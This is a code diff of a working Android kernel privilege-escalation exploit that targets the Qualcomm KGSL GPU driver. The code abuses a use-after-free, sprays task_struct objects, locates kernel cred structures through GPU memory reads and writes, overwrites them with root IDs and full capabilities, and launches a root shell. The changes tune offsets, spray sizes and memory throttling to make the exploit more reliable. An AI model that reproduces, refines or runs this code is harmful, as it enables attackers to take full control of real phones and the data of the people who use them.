@@ -32,8 +32,8 @@
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_CRED          0x870
-#define OFFSET_REAL_CRED     0x878
+#define OFFSET_REAL_CRED     0x870
+#define OFFSET_CRED          0x878
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -214,9 +214,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 1
-#define SPRAY_COUNT 60000
+#define SPRAY_COUNT 40000
 #define SPRAY_COUNT_STEP 100
-#define SPRAY_COUNT_MAX 100000
+#define SPRAY_COUNT_MAX 80000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -474,7 +474,7 @@ static int setup_gpu_persistent(int fd) {
             break;
         }
         if (retry % 5 == 0) fprintf(stderr, "[GPU] Waiting for context slot... (%d left)\n", retry);
-        usleep(300000);
+        usleep(100000);
     }
     if (g_persistent_ctx_id == 0) return -1;
 
@@ -496,6 +496,28 @@ static int setup_gpu_persistent(int fd) {
     g_persistent_dst_gpu = info.gpuaddr;
 
     return 0;
+}
+
+static void cleanup_gpu_persistent(int fd) {
+    if (g_persistent_ib_vma && g_persistent_ib_vma != MAP_FAILED)
+        munmap(g_persistent_ib_vma, PAGE_SIZE * 8);
+    if (g_persistent_dst_vma && g_persistent_dst_vma != MAP_FAILED)
+        munmap(g_persistent_dst_vma, PAGE_SIZE * 2);
+    
+    struct kgsl_gpuobj_free fr = {0};
+    if (g_persistent_ib_id) { fr.id = g_persistent_ib_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+    if (g_persistent_dst_id) { fr.id = g_persistent_dst_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+    
+    if (g_persistent_ctx_id) {
+        struct kgsl_drawctxt_destroy dctx = {.drawctxt_id = g_persistent_ctx_id};
+        ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
+    }
+    
+    g_persistent_ctx_id = 0;
+    g_persistent_ib_id = 0;
+    g_persistent_dst_id = 0;
+    g_persistent_ib_vma = NULL;
+    g_persistent_dst_vma = NULL;
 }
 
 #define MMAP_SPRAY_COUNT 4000
@@ -1202,17 +1224,17 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
-    int max_patches = 300; 
+    int max_patches = 200; // Снижено с 300
     uint8_t *page = malloc(PAGE_SIZE);
     
     // Scan all pages in the UAF range
     for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
         // Stability check: RAM usage during mass patch
-        if (patch_count % 100 == 0) {
+        if (patch_count % 50 == 0) { // Проверяем чаще
             double ram = get_ram_usage_percentage();
-            if (ram > 90.0) {
+            if (ram > 80.0) { // Порог ниже
                 fprintf(stderr, "[PARENT] Mass patch throttling: RAM at %.1f%%. Resting...\n", ram);
-                usleep(500000);
+                usleep(800000); // Отдыхаем дольше
             }
         }
 
@@ -1228,10 +1250,10 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                     patch_count++;
                     if (patch_count > max_patches) break;
 
-                    // Silent mode: only log every 100
-                    if (patch_count % 100 == 0) {
+                    // Silent mode: only log every 50
+                    if (patch_count % 50 == 0) {
                         fprintf(stderr, "[PARENT] Mass patching in progress: %d structures done.\n", patch_count);
-                        usleep(20000); 
+                        usleep(50000); 
                     }
                     
                     uint8_t zero_creds[32] = {0};
@@ -1240,6 +1262,7 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                     uint8_t all_caps[32];
                     memset(all_caps, 0xff, 32);
                     gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
+                    usleep(5000); // Микропауза между записями
                 }
             }
         }
@@ -1367,9 +1390,8 @@ shell:
     setresgid(0, 0, 0);
 
     fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
-    fprintf(stderr, "[CHILD %d] Verified identity: ", getpid());
+    fprintf(stderr, "[CHILD %d] Verified identity: UID=%d GID=%d\n", getpid(), getuid(), getgid());
     fflush(stderr);
-    system("id"); // Real-time check
     
     // Set environment for root
     setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp", 1);
@@ -1731,7 +1753,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
     dst_gpu = info.gpuaddr;
 
     // Сдвигаем окно сканирования в зависимости от номера батча
-    uint64_t scan_offset = (batch_idx * 0x800000ULL) % UAF_SIZE; // Уменьшили шаг для более тщательного поиска
+    uint64_t scan_offset = (batch_idx * 0x400000ULL) % UAF_SIZE; // Уменьшили шаг для более тщательного поиска
     uint64_t current_va = UAF_START + scan_offset;
     uint64_t end_va = UAF_START + UAF_SIZE;
     
@@ -1739,16 +1761,16 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
             (unsigned long)scan_offset, (unsigned long)current_va);
     
     int total_pages_scanned = 0;
-    double initial_ram = get_ram_usage_percentage();
+    int max_pages_to_scan = 2048; // Снижено с 4096 для стабильности
 
-    while (total_pages_scanned < SCAN_MAX_PAGES && !marker_found)
+    while (total_pages_scanned < max_pages_to_scan && !marker_found)
     {
         if (current_va >= end_va) current_va = UAF_START;
 
         double current_ram = get_ram_usage_percentage();
-        if (current_ram > 95.0) { // Повысили порог до 95%
+        if (current_ram > 85.0) { // Снизили порог до 85%
             fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
-            usleep(1000000); 
+            usleep(1500000); 
             continue; 
         }
 
@@ -1821,12 +1843,6 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 // RECORD TARGET INFO AND EXIT SCAN (Cleanup will happen in main)
                 fprintf(stderr, "\n    [!] TARGET LOCATED (PID %d). Preparing for cleanup and patch...\n", found_pid);
                 
-                // Detailed Info: Dump task_struct around marker
-                uint8_t task_dump[256];
-                if (gpu_read_task_struct(fd, task_start_va + OFFSET_COMM - 128, task_dump, 256) == 0) {
-                    hex_dump_internal("TASK_STRUCT AROUND COMM", task_start_va + OFFSET_COMM - 128, task_dump, 256);
-                }
-                
                 marker_found = 1;
                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
                 *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
@@ -1835,13 +1851,13 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
             }
         }
 
-        current_va += PAGE_SIZE * SCAN_PAGE_STEP;
+        current_va += PAGE_SIZE * 8; // Увеличили шаг до 8 для скорости
         total_pages_scanned++;
-        if (total_pages_scanned % SCAN_PROGRESS_EVERY == 0) { 
+        if (total_pages_scanned % 256 == 0) { 
             fprintf(stderr, "."); fflush(stderr); 
-            usleep(100000); // Разгружаем GPU/CPU каждые 512 страниц
+            usleep(200000); 
         }
-        usleep(1000); // Минимальная пауза между страницами
+        usleep(5000); // Минимальная пауза между страницами увеличена
     }
 
 cleanup:
@@ -2224,11 +2240,8 @@ int main(int argc, char **argv)
         exit(1);
     }
     memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
-// Принудительная очистка памяти перед запуском
-system("sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
-sleep(1);
-
-// Находим PID system_server
+    
+    // Находим PID system_server
 DIR *dir = opendir("/proc");
 if (!dir) {
     perror("opendir /proc");
@@ -2513,9 +2526,9 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 80,000)\n");
-    int total_limit = 80000;
-    int batch_size = 2000; 
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 40,000)\n");
+    int total_limit = 40000;
+    int batch_size = 1000; 
     int total_sprayed = 0;
     int marker_found_global = 0;
     int window_idx = 0;
@@ -2525,7 +2538,7 @@ restart:;
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        int reached_mem_limit = (ram_usage > 90.0); 
+        int reached_mem_limit = (ram_usage > 75.0); 
         
         if (!reached_mem_limit || total_sprayed == 0) {
             for (int i = 0; i < batch_size && total_sprayed < total_limit; i++) {
@@ -2550,7 +2563,7 @@ restart:;
                             }
                             _exit(0);
                         }
-                        usleep(50000); 
+                        usleep(100000); // 100ms
                     }
                     _exit(0);
                 }
@@ -2562,10 +2575,11 @@ restart:;
                     total_sprayed++;
                 } else if (errno == EAGAIN) {
                     fprintf(stderr, "\n[!] fork() EAGAIN. Throttling...\n");
-                    sleep(1);
+                    sleep(2);
                     break;
                 }
             }
+            usleep(100000); // 100ms pause after batch
         }
 
         if (reached_mem_limit || (total_sprayed > 0 && total_sprayed % batch_size == 0) || total_sprayed >= total_limit) {
@@ -2603,17 +2617,24 @@ restart:;
         }
         fprintf(stderr, "[+] Sent SIGKILL to %d spray processes. Reaping...\n", killed);
     }
+    usleep(500000); // Wait for SIGKILL to take effect
     reap_all_children();
-    usleep(200000);
+    usleep(500000); // Wait for OS to free memory
+    
+    // Check RAM after cleanup
+    fprintf(stderr, "[+] RAM Usage after cleanup: %.1f%%\n", get_ram_usage_percentage());
 
     // Final check if target is still alive (no gbuf reset here, just log)
     if (kill(target_pid, 0) != 0) {
         fprintf(stderr, "[!] Warning: Target PID %d not responding to signal 0, but proceeding...\n", target_pid);
     }
 
-    // 2. NOW PERFORM PATCHING with free memory
+    // NOW PERFORM PATCHING with free memory
     fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", target_pid);
     parent_patch_root(fd, target_cred_ptr);
+    
+    // Cleanup persistent GPU resources
+    cleanup_gpu_persistent(fd);
     
     // Signal the child to activate
     gbuf[0] = 0xab;
